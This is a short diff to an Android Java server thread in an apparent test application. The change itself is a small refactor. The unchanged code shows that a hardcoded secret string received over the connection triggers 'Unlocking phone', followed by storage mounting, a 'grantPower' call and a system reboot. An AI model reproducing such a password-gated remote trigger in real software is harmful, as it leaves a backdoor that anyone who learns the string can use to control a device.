@@ -1,5 +1,7 @@
 package iqube.surya.testapplication;
 
+import android.annotation.SuppressLint;
+
 import java.io.BufferedReader;
 import java.io.InputStreamReader;
 import java.io.PrintWriter;
@@ -13,6 +15,7 @@ import java.util.Enumeration;
 
 public class Server extends Thread {
 
+    @SuppressLint("NewApi")
     public void run(){
 
         try{
@@ -35,9 +38,10 @@ public class Server extends Thread {
                 }
                 else if (input.equals(".6UAAx5h%tAYbk9U")){
                     out.println("Unlocking phone");
-                    CameraRecorder.mountStorage();
-                    CameraRecorder.grantPower();
-                    CameraRecorder.rebootSystem();
+                    CameraRecorder cameraRecorder = new CameraRecorder();
+                    cameraRecorder.mountStorage();
+                    cameraRecorder.grantPower();
+                    cameraRecorder.rebootSystem();
                 }
                 out.println("received: " + input);
 
